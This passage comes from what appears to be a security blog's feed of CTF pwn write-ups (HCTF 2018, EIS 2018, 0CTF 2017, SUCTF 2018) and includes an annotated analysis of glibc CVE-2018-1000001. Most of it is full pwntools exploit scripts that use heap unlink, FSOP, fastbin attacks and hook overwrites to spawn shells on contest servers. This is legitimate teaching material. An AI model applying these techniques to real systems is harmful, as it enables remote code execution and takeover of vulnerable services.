p64(0) * 5 + p64(heap_chunk_base + (0x555555757230 - 0x555555756fe0)) Allocate(p, 0x37, payload + '\n') # vtable Delete(p, 13) payload = p64(0) + p64(1) + p64(2) + p64(libc.symbols['system']) Allocate(p, 0x37, payload + '\n') p.sendlineafter('Choice:', str(1)) p.sendlineafter('size:', str(0x17)) p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EIS 2018 pwn writeup]]></title>
    <url>%2F2018%2F11%2F18%2FEIS18-pwn%2F</url>
    <content type="text"><![CDATA[hack思路与pwnable.kr的unlnk一致，通过unlink操作对栈上的值进行修改，从而将栈劫持到堆上，返回到one_gadget处。可以进行两次泄漏，分别泄漏libc地址和栈地址。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# coding=utf-8from pwn import *def pwn(): BIN_PATH = './hack' DEBUG = 0 context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('210.32.4.16', 13375) elf = ELF(BIN_PATH) libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so') context.log_level = 'debug' p.recvuntil('input address: ') p.sendline(str(elf.got['puts'])) p.recvuntil(str(elf.got['puts']) + ', ') recv = p.recvuntil('\n') libc.address = int(recv, 16) - libc.symbols['puts'] print hex(libc.address) p.recvuntil('Second chance: \n') p.sendline(str(libc.symbols['__environ'])) p.recvuntil(', ') recv = p.recvuntil('\n') stack_address = int(recv, 16) print hex(stack_address) raw_input() p.recvuntil('The address of the node is ') recv = p.recvuntil(', ', drop=True) heap_addr = int(recv, 16) target_address = stack_address - (0xffb3d93c - 0xffb3d884) if DEBUG == 1: one_gadget = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5, 0x5fbc6] else: one_gadget = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819] payload = p32(libc.address + one_gadget[3]) + p32(heap_addr + 12) + p32(heap_addr + 0x4) + p32(target_address - 0x8) p.recvuntil('fake node now: ') p.send(payload) # EIS&#123;d2954e2d38bf6b2ed3ebfead7bb6cd33&#125; p.interactive() p.close()if __name__ == '__main__': pwn() 师兄说本题这个解法是非预期解，看了出题人的思路后，感觉出题人可能忘了libc中能够泄漏栈地址。 justnote程序实现了一般堆题的功能，有Add()、Edit()和Delete()，在Add()中能将用户输入后的chunk内容打印。申请堆块时固定申请0x100，chunk地址和用户输入的长度也保存在堆上，但是保存的地址进行了异或。 初一看没什么问题，后来经师傅提醒，如果输入最大的负数，就能够进行堆溢出： 12345678910111213new_chunk = (__int64)calloc(0x100uLL, 1uLL);if ( !new_chunk )&#123; puts("memory error, contact admin"); exit(1);&#125;printf("length of note: ", 1LL);length = input_num(); // vulnerableif ( length &lt; 0 ) length = -length;if ( length &gt; 0xFF ) length = 0xFFLL;printf("note: "); 随后利用这个堆溢出进行FSOP即可。在写exp的时候利用House Of Orange的方法一直有问题，后来先搞定一个0x60的chunk放入small bin，然后再unsorted bin attack和伪造FILE结构体就没问题了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112# coding=utf-8from pwn import *def Add(p, length, content): p.sendlineafter('your choice: ', str(1)) p.sendlineafter('length of note: ', str(length)) p.sendlineafter('note: ', content)def Delete(p, idx): p.sendlineafter('your choice: ', str(2)) p.sendlineafter('index of note: ', str(idx))def Edit(p, idx, content): p.sendlineafter('your choice: ', str(3)) p.sendlineafter('index of note: ', str(idx)) p.sendlineafter('note: ', content)def pwn(): BIN_PATH = './justnote' DEBUG = 0 LOCAL_LIBC = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('210.32.4.17', 13376) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # is same as the remote context.log_level = 'debug' Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Delete(p, 0) Delete(p, 2) payload = 'a' * (0x4440 - 0x4220) Add(p, -9223372036854775808, payload) #0 p.recvuntil(payload) libc_m88_addr = p.recv(6) if LOCAL_LIBC == 1: libc.address = u64(libc_m88_addr.ljust(8, '\x00')) - (0x7f5eae196b78 - 0x7f5eaddd2000) print 'libc base:' + str(hex(libc.address)) payload = 'b' * (0x108) + p64(0x111) + 'b' * (0x108) + p64(0x111) Edit(p, 0, payload) Add(p, 0x20, 'sunichi') #2 Delete(p, 0) Delete(p, 2) Delete(p, 4) payload = 'c' * (0x5575f99b1448 - 0x5575f99b1220) Add(p, -9223372036854775808, payload) #0 p.recvuntil(payload) stack_chunk_4 = p.recv(6) heap_chunk_base = u64(stack_chunk_4.ljust(8, '\x00')) - (0x55ca81101650 - 0x55ca81101210) print 'heap chunk base:' + str(hex(heap_chunk_base)) payload = 'd' * (0x108) + p64(0x111) + 'b' * (0x108) + p64(0x111) + libc_m88_addr + '\x00' * 2 + p64(libc.symbols['_IO_list_all'] - 0x10) Edit(p, 0, payload) payload = 'e' * (0x210) + p64(0) + p64(0x61) + libc_m88_addr + '\x00\x00' + p64(heap_chunk_base + 0x440) Edit(p, 0, payload) Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Delete(p, 2) payload = 'f' * 0x430 + p64(0) + p64(0x110) + p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10) Edit(p, 0, payload) payload = 'g' * (0x210) fake_stream = '/bin/sh\x00' + p64(0x61) fake_stream += p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10) fake_stream += p64(heap_chunk_base) + p64(heap_chunk_base + 1) fake_stream = fake_stream.ljust(0xa0, '\x00') fake_stream += p64(heap_chunk_base + 0x300 - 0x10) fake_stream = fake_stream.ljust(0xc0, '\x00') fake_stream += 3 * p64(0) + p64(heap_chunk_base + 0x300 - 0x8) payload += fake_stream payload += p64(2) payload += p64(3) payload += p64(libc.symbols['system']) + p64(0) * 0x20 Edit(p, 0, payload) Add(p, 0x70, 'hack by sunichi') Delete(p, 2) p.interactive() p.close() # EIS&#123;it_is_2018_and_we_still_mess_around_with_note&#125;if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>eis</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE–2018-1000001 & hctf 2018 easyexp]]></title>
    <url>%2F2018%2F11%2F16%2Fhctf18-easyexp%2F</url>
    <content type="text"><![CDATA[做题的时候有考虑过CVE，但当时没去查…… CVE–2018-1000001该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。 以下分析stdlib/canonicalize.c中的__realpath()函数（__canonicalize_file_name仅仅调用__realpath()，没有其它操作）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197/* Return the canonical absolute name of a given file. Copyright (C) 1996-2016 Free Software Foundation, Inc. This file is part of the GNU C Library. The GNU C Library is free software; you can redistribute it and/or modify it under the terms of the GNU Lesser General Public License as published by the Free Software Foundation; either version 2.1 of the License, or (at your option) any later version. The GNU C Library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more details. You should have received a copy of the GNU Lesser General Public License along with the GNU C Library; if not, see &lt;http://www.gnu.org/licenses/&gt;. */#include &lt;assert.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;limits.h&gt;#include &lt;sys/stat.h&gt;#include &lt;errno.h&gt;#include &lt;stddef.h&gt;#include &lt;eloop-threshold.h&gt;#include &lt;shlib-compat.h&gt;/* Return the canonical absolute name of file NAME. A canonical name does not contain any `.', `..' components nor any repeated path separators ('/') or symlinks. All path components must exist. If RESOLVED is null, the result is malloc'd; otherwise, if the canonical name is PATH_MAX chars or more, returns null with `errno' set to ENAMETOOLONG; if the name fits in fewer than PATH_MAX chars, returns the name in RESOLVED. If the name cannot be resolved and RESOLVED is non-NULL, it contains the path of the first component that cannot be resolved. If the path can be resolved, RESOLVED holds the same value as the value returned. */char *__realpath (const char *name, char *resolved) //name是传入的字符串&#123; char *rpath, *dest, *extra_buf = NULL; const char *start, *end, *rpath_limit; long int path_max; int num_links = 0; // ... // 此部分是常规的一些检查，不影响理解代码逻辑 // ... // 设置path_max参数#ifdef PATH_MAX path_max = PATH_MAX;#else path_max = pathconf (name, _PC_PATH_MAX); if (path_max &lt;= 0) path_max = 1024;#endif if (resolved == NULL) // __canonicalize_file_name默认传参NULL &#123; rpath = malloc (path_max); // 申请保存解析后的路径的chunk，发生溢出的即为该chunk if (rpath == NULL) return NULL; &#125; else rpath = resolved; rpath_limit = rpath + path_max; if (name[0] != '/') &#123; if (!__getcwd (rpath, path_max)) // getcwd返回rpath的地址 &#123; rpath[0] = '\0'; goto error; &#125; dest = __rawmemchr (rpath, '\0'); // dest记录rpath中字符串的结尾 &#125; else &#123; rpath[0] = '/'; dest = rpath + 1; &#125; for (start = end = name; *start; start = end) &#123; struct stat64 st; int n; /* Skip sequence of multiple path-separators. */ while (*start == '/') // 如果以/开头，向后移动 ++start; /* Find end of path component. */ for (end = start; *end &amp;&amp; *end != '/'; ++end) /* Nothing. */; if (end - start == 0) break; else if (end - start == 1 &amp;&amp; start[0] == '.') /* nothing */; else if (end - start == 2 &amp;&amp; start[0] == '.' &amp;&amp; start[1] == '.') &#123; /* Back up to previous component, ignore if at root already. */ // dest初始值为rpath中字符串（getcwd返回值）的结尾 // 如果遇到..，向前搜索/字符，初始情况下：dest = rpath + len &gt; rpath + 1。所以在第一个..时会在while中出现前向溢出 if (dest &gt; rpath + 1) while ((--dest)[-1] != '/'); &#125; else &#123; size_t new_size; if (dest[-1] != '/') *dest++ = '/'; // 在触发漏洞前，dest已经向前溢出，加上len后不会超过rpath_limit if (dest + (end - start) &gt;= rpath_limit) // rpath_limit = rpath + path_max &#123; // ... &#125; // dest为前溢地址，start为路径../../x处的x的地址，即从路径中拷贝第三个片段到dest中 // void *mempcpy（void *dest, const void *src, size_t len) dest = __mempcpy (dest, start, end - start); *dest = '\0'; // __lxstat64可以用来检查rpath指向的文件是否存在，rpath即为(unreachable)/xxxxx if (__lxstat64 (_STAT_VER, rpath, &amp;st) &lt; 0) goto error; if (S_ISLNK (st.st_mode)) &#123; char *buf = __alloca (path_max); size_t len; if (++num_links &gt; __eloop_threshold ()) &#123; __set_errno (ELOOP); goto error; &#125; n = __readlink (rpath, buf, path_max - 1); if (n &lt; 0) goto error; buf[n] = '\0'; if (!extra_buf) extra_buf = __alloca (path_max); len = strlen (end); if ((long int) (n + len) &gt;= path_max) &#123; __set_errno (ENAMETOOLONG); goto error; &#125; /* Careful here, end may be a pointer into extra_buf... */ memmove (&amp;extra_buf[n], end, len + 1); name = end = memcpy (extra_buf, buf, n); if (buf[0] == '/') dest = rpath + 1; /* It's an absolute symlink */ else /* Back up to previous component, ignore if at root already: */ if (dest &gt; rpath + 1) while ((--dest)[-1] != '/'); &#125; else if (!S_ISDIR (st.st_mode) &amp;&amp; *end != '\0') &#123; __set_errno (ENOTDIR); goto error; &#125; &#125; &#125; if (dest &gt; rpath + 1 &amp;&amp; dest[-1] == '/') --dest; *dest = '\0'; assert (resolved == NULL || resolved == rpath); return rpath;error: assert (resolved == NULL || resolved == rpath); if (resolved == NULL) free (rpath); return NULL;&#125;versioned_symbol (libc, __realpath, realpath, GLIBC_2_3);char *__canonicalize_file_name (const char *name)&#123; return __realpath (name, NULL);&#125;weak_alias (__canonicalize_file_name, canonicalize_file_name) 从源代码中可以发现，如果getcwd返回的地址不以/开头的话，就会产生堆的上溢的问题，同时能够向这个上溢的地址写入数据。 easyexp本题的原理即__canonicalize_file_name。在本题中，由于程序变更工作目录后，并没有更新当前目录的根目录，因此getcwd() 会在返回的路径前加上(unreachable)，即getcwd()在本题中返回(unreachable)/tmp。随后为了保证程序正常运行，需要通过__lxstat64()的检查，所以需要保证(unreachable)/tmp存在，故将用户名设置为(unreachable)并在该文件夹下创建名为tmp的文件。 由于存在堆上的前溢且程序构造了堆的使用，因此可以修改chunk的pre_inuse，利用unlink获得shell。 程序创建文件的过程在程序中定义了如下数据结构： 12345struct FILE_CACHE &#123; char *content; int content_length; char filename[84];&#125; 在bss上存在一个FILE_CACHE[3]数组用于保存相关信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243if ( filename )&#123; if ( strstr(filename, "..") || *filename == '/' ) &#123; puts("you can't go out of tmpfs"); &#125; else &#123; for ( i = 0; i &lt;= 2; ++i ) &#123; if ( !strcmp(filename, (const char *)(0x60LL * i + 0x60318C)) ) &#123; printf("write something:"); InputString((__int64)FILE_CACHE[12 * i], (unsigned int)FILE_CACHE[12 * i + 1]); g_idx = (i + 1) % 3; return __readfsqword(0x28u) ^ v8; &#125; &#125; if ( FILE_CACHE[12 * g_idx] ) &#123; s = fopen((const char *)(0x60LL * g_idx + 0x60318C), "w"); fwrite(FILE_CACHE[12 * g_idx], 1uLL, LODWORD(FILE_CACHE[12 * g_idx + 1]), s); fclose(s); free((void *)FILE_CACHE[12 * g_idx]); &#125; strcpy((char *)(0x60LL * g_idx + 0x60318C), filename); fd = open(filename, 131521, 420LL); if ( fd &lt; 0 ) &#123; puts("mkfile:create failed."); exit(-1); &#125; printf("write something:"); InputString((__int64)&amp;buf, 0x1000u); write(fd, &amp;buf, 0x1000uLL); v2 = g_idx; FILE_CACHE[12 * v2] = strdup(&amp;buf); v3 = g_idx; LODWORD(FILE_CACHE[12 * v3 + 1]) = strlen(&amp;buf); close(fd); g_idx = (g_idx + 1) % 3; &#125;&#125; 以上程序位于创建文件的函数中，当用户创建文件时，会现在“缓存”中查找，如果文件名相同或“缓存”未满，则会在“缓存”上保存一份数据，如已满则重置一个“缓存”。这里的结构可以在unlink中进行利用。 程序创建文件夹的过程12345678910111213141516171819for ( i = 0; ; i = *(_DWORD *)v3 + 1 )&#123; *(_QWORD *)&amp;v3[4] = strchr(&amp;a1[i], '/'); if ( *(_QWORD *)&amp;v3[4] ) *(_DWORD *)v3 = *(_DWORD *)&amp;v3[4] - (_DWORD)a1; else *(_QWORD *)v3 = (unsigned int)strlen(a1); snprintf(&amp;path, 0x1000uLL, "%s/%.*s", cur_work_dir, *(unsigned int *)v3, a1); mkdir(&amp;path, 0x1EDu); if ( !a1[*(signed int *)v3] ) break;&#125;ptr = canonicalize_file_name(a1);if ( !ptr )&#123; puts("mkdir:create failed."); exit(-1);&#125;free(ptr); 当程序调用mkdir()函数后，会将用户输入的路径传入canonicalize_file_name()进行验证是否创建成功，此处即为触发漏洞的位置。 利用思路当“缓存”满后，将会重用最后使用的“缓存”的下一个“缓存”。首先将三个“缓存”都填满，第二个缓存内容均为’/‘，利用CVE漏洞改写第三个“缓存”指向的内容的chunk的size域，将size改小（防止和top chunk合并）并布置合适的fake chunk。 随后进行unlink攻击，通过改写“缓存”结构体中的内容指针来泄漏地址和修改__free_hook。 Exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# coding=utf-8from pwn import *def Mkfile(p, filename, content): p.sendlineafter('$', 'mkfile ' + filename) p.sendlineafter('write something:', content)def Mkdir(p, path): p.sendlineafter('$', 'mkdir ' + path)def pwn(): BIN_PATH = './easyexp' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH, env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] libc = ELF('./libc.so.6') p.sendlineafter('input your home\'s name: ', '(unreachable)') Mkfile(p, 'hack', 'hack by sunichi') Mkfile(p, '(unreachable)/tmp', '/' * 0x107) Mkfile(p, 'aa', 'a' * (0x90 + 0x20)) Mkdir(p, '../../s\x90') Mkdir(p, '../../\x00') payload = 'a' * 0x88 + p64(0x31) Mkfile(p, 'aa', payload) payload = 'a' * 0x100 + p64(0x100) Mkfile(p, '(unreachable)/tmp', payload) payload = p64(0) + p64(0x101) + p64(0x6031e0 - 0x18) + p64(0x6031e0 - 0x10) Mkfile(p, '(unreachable)/tmp', payload) Mkfile(p, 'bb', 'bb') payload = p64(0) * 3 + p64(0x6031e0) + p64(0x726e752800000100) + p64(0x656c626168636165) + p64(0x000000706d742f29) + p64(0) * 8 + p64(elf.got['free']) + p64(0x0000626200000008) Mkfile(p, '(unreachable)/tmp', payload) p.sendlineafter('$', 'cat bb') p.recvuntil('\x20') recv = p.recvuntil('\x0a\x1b', drop=True) libc.address = u64(recv + '\x00\x00') - libc.symbols['free'] print hex(libc.address) payload = p64(libc.symbols['__free_hook']) + p64(0x726e752800000100) + p64(0x656c626168636165) + p64(0x000000706d742f29) + p64(0) * 8 + p64(next(libc.search('/bin/sh\x00'))) + p64(0x0000626200000008) Mkfile(p, '(unreachable)/tmp', payload) payload = p64(libc.symbols['system']) Mkfile(p, '(unreachable)/tmp', payload) p.sendlineafter('$', 'mkfile getshell') p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>cve</tag>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
        <tag>libc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hctf 2018 pwn writeup]]></title>
    <url>%2F2018%2F11%2F12%2Fhctf2018%2F</url>
    <content type="text"><![CDATA[the_end程序自身的功能很简单： 提供libc地址（2.23） 关闭stdout和stderr 5次对所给地址修改1字节的机会 在进行5次修改后，程序调用了exit()函数。一开始的思路是对libc中的FILE结构体进行修改，从而将程序劫持到one_gadget处，但是比赛时想到的方法大概需要10字节左右的修改，放弃。 接着就开始对exit()函数进行研究，在gdb里对exit()函数一步一步地进行跟踪，发现两个能利用的点： 0x00 CTF 2017 left 的解题思路，但是无法获得随机数，放弃。 在_dl_fini函数中，会执行call QWORD PTR [rip+0x216414] #&lt;_rtld_global+3848&gt;，该位置位于ld.so当中，是能够修改的位置。 因此在第二个点的基础上继续研究。通过vmmap可以得知ld.so的这个位置到libc.so.6的基地址的偏移是固定的，虽然他们中间的空间不是连续的（后续再具体研究一下为什么Orz，这题中没问题就对啦）。将该位置的数据修改为one_gadget即可。 另一个需要解决的问题是程序关闭了stdout，所以拿到shell后无法看到服务器的返回。通过exec /bin/sh 1&gt;&amp;0即可对输出流进行重定向，能正常与shell交互。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# coding=utf-8from pwn import *def pwn(): BIN_PATH = './the_end' DEBUG = 1 local = 1 if DEBUG == 1: if local == 1: p = process(BIN_PATH) else: p = process(BIN_PATH, env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': if local == 1: libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('./libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('150.109.44.250', 20002) p.recvuntil('Input your token:') p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz') elf = ELF(BIN_PATH) libc = ELF('./libc.so.6') context.log_level = 'debug' if DEBUG == 1: gdb.attach(p, gdbscript='b *0x0000555555554964') p.recvuntil('here is a gift ') recv = p.recvuntil(',', drop=True) libc.address = int(recv, 16) - libc.symbols['sleep'] print hex(libc.address) one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] p.recvuntil('luck ;)\n') p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000))) p.send(p64(libc.address + one_gadget[2])[0]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 1)) p.send(p64(libc.address + one_gadget[2])[1]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 2)) p.send(p64(libc.address + one_gadget[2])[2]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 3)) p.send(p64(libc.address + one_gadget[2])[3]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 4)) p.send(p64(libc.address + one_gadget[2])[4]) # exec /bin/sh 1&gt;&amp;0 p.interactive() p.close()if __name__ == '__main__': pwn() babyprintf_ver2程序本身实现了类似于格式化字符串漏洞的功能，但调用的是printf_chk()函数。用于保存用户输入的字符串的全局变量存在溢出，能够覆盖stdout指针，程序提供了.bss的地址。 因此，通过溢出将stdout指针指回.bss上，并在指向的地方构造虚假的stdout结构体，由于存在着vtable的检查，因此vtable处的值会被程序自己填入。通过构造缓冲区的指针为.bss上的地址，能够将这个vtable的值泄漏出来，从而获得libc的基地址。 同样地，通过构造缓冲区的指针，能够进行任意地址写的操作，将__malloc_hook处修改为one_gadget的地址。通过触发printf_chk()函数的报错进而触发malloc()拿到shell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# coding=utf-8from pwn import *def pwn(): BIN_PATH = './babyprintf_ver2' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('150.109.44.250', 20005) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.recvuntil('Input your token:') p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz') context.log_level = 'debug' p.recvuntil('buffer location to') recv = p.recvuntil('\n', drop=True) bss_address = int(recv, 16) p.recvuntil('Have fun!\n') payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) + p64(bss_address + 0xf8) * 3 payload += p64(bss_address + 0xf8) + p64(bss_address + 0x100) + p64(bss_address + 0x11d) payload += p64(bss_address + 0xf8) + p64(bss_address + 0x11d) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) p.recvuntil('permitted!\n') p.sendline('a' * 8) recv = p.recv(8) libc.address = u64(recv) - (0x7ffff7dcc2a0 - 0x7ffff79e4000) print hex(libc.address) payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) payload += p64(bss_address + 0x200) * 7 payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) malloc_hook_addr = libc.symbols['__malloc_hook'] payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) payload += p64(bss_address + 0x200) * 6 payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8 + 4) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) p.sendline(p64(libc.address + 0x10a38c)) # one_gadget payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) payload += p64(bss_address + 0x200) * 7 payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) sleep(0.5) p.sendline('%49$p') p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf 2017 babyheap]]></title>
    <url>%2F2018%2F07%2F11%2F0ctf17-pwn-babyheap%2F</url>
    <content type="text"><![CDATA[This pwn is a classic heap pwn. In its Edit() function exits a heap overflow of arbitrarily write. 1234567891011121314151617181920212223242526__int64 __fastcall Edit(__int64 List)&#123; __int64 Item; // rax int v2; // [rsp+18h] [rbp-8h] int len; // [rsp+1Ch] [rbp-4h] printf("Index: "); Item = InputNum(); v2 = Item; if ( (signed int)Item &gt;= 0 &amp;&amp; (signed int)Item &lt;= 15 ) &#123; Item = *(unsigned int *)(24LL * (signed int)Item + List); if ( (_DWORD)Item == 1 ) &#123; printf("Size: "); // overflow Item = InputNum(); len = Item; if ( (signed int)Item &gt; 0 ) &#123; printf("Content: "); Item = InputString(*(_QWORD *)(24LL * v2 + List + 16), len); &#125; &#125; &#125; return Item;&#125; Because the List(contains each block’s status, size and content’s pointer) is at random address, we cannot overflow and overwrite the List. So what I chose to do is to overflow the chunk to leak the libc information and perform fastbin attack. 1234567891011121314151617181920212223242526272829def pwn(): p = process('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] gdb.attach(p, gdbscript='b *' + str(hex(0x555555554000 + 0x113d))) Add(p, 0x60) #0 Add(p, 0x60) #1 Add(p, 0x60) #2 Add(p, 0x60) #3 Add(p, 0x80) #4 Add(p, 0x80) #5 Add(p, 0x200 - 0x90 - 0x10) #6 Add(p, 0x80) #7 Add(p, 0x80) #8 Edit(p, 4, 'a' * 0x88 + p64(0x201)) Delete(p, 5) #5 Add(p, 0x80) #5 recv = Show(p, 6) libc_base_addr = u64(recv[0:8]) - 0x3c4b78 libc.address = libc_base_addr print hex(libc.symbols['__malloc_hook']) # chunk size 0x7f, ready for fastbin attack fake_chunk = libc.symbols['__malloc_hook'] - 0x10 - 3]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>0ctf</tag>
        <tag>2017</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suCTF1 2018 pwn heap(offbyone) writeup]]></title>
    <url>%2F2018%2F07%2F07%2Fsuctf18-pwn-heap(offbyone)%2F</url>
    <content type="text"><![CDATA[Checksec： 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) This pwn exists off-by-one: When pwner wants to get a new chunk, the program will malloc() two same size chunk. The pwner’s input will be put into the first chunk, and then the program uses strcpy() without input size to do the memory copy. The first chunk will be free() very soon. 12345678910111213141516171819202122if ( size &gt; 0x7F &amp;&amp; size &lt;= 0x100 )&#123; fake_new_chunk = malloc(size); new_chunk = malloc(size); memset(new_chunk, 0, size); memset(fake_new_chunk, 0, size); puts("input your data"); read(0, fake_new_chunk, (unsigned int)size); strcpy((char *)new_chunk, (const char *)fake_new_chunk); ++total; for ( i = 0; i &lt; total; ++i ) &#123; if ( !heap_form[i] ) &#123; heap_form[i] = (char *)new_chunk; break; &#125; &#125; if ( i == total ) heap_form[i] = (char *)new_chunk; free(fake_new_chunk);&#125; If pwner doesn’t enter \x00 to end the string, the next chunk’s size will be regarded as a part of the string. Here exists off-by-one. We first malloc() 5 chunks, chunk 1-4 will reuse the first chunk’s fake_new_chunk to do the string copy. Chunk 1 will be used to get shell by system(). 1234567891011def pwn(): p = process('./offbyone') elf = ELF('./offbyone') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' # chunk size 0x80 ~ 0x100 Add(p, 0x100, '0' * 0x100) Add(p, 0x100, '/bin/sh\x00') Add(p, 0x100, '2' * 0x100) Add(p, 0x88, '3' * 0x88) Add(p, 0x100, '4' * 0x100) Construct a fake chunk of size 0x80 and set chunk 4 pre_inuse to 0 then perform the unlink attack. 123456payload = 2 * p64(0)payload += p64(0x6020d8 - 0x18) + p64(0x6020d8 - 0x10)payload = payload.ljust(0x80,'\x00')payload += p64(0x80) + '\x10'Edit(p, 3, payload)Delete(p, 4) When we free() the chunk 4, it will merge the fake chunk 3 of size 0x80 instead of 0x90. The unlink attack detail: 12345FD = 0x6020c0;BK = 0x6020c8;// will pass the security checkFD-&gt;bk = BK; // *(0x6020d8) = 0x6020c8BK-&gt;fd = FD; // *(0x6020d8) = 0x6020c0 After unlink, the chunk_list[3] will point to the chunk_list[0]’s address and we will have the ability to write and read arbitrarily. Then leak the libc address and get the shell by overwrite the free@got. 1234567891011Edit(p, 3, p64(elf.got['malloc']))libc_base_addr = Show(p, 0)libc_base_addr = u64(libc_base_addr.ljust(8, '\x00')) - 